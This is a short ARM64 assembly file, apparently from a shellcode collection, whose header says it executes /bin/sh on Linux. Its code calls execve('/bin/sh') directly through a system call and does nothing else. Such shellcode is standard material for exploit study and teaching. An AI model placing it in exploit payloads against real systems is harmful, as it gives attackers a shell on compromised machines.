/**
  execute /bin/sh
  tested with linux running on ubuntu

  http://modexp.wordpress.com/   
*/

    .global _start
    .text

_start:
    // execve("/bin/sh", NULL, NULL);
    adr    x0, sh         // x0 = "/bin/sh"
    eor    x1, x1, x1     // x1 = NULL
    eor    x2, x2, x2     // x2 = NULL
    mov    x8, #221       // x8 = execve
    svc    1
sh:    
    .ascii "/bin/sh\0"
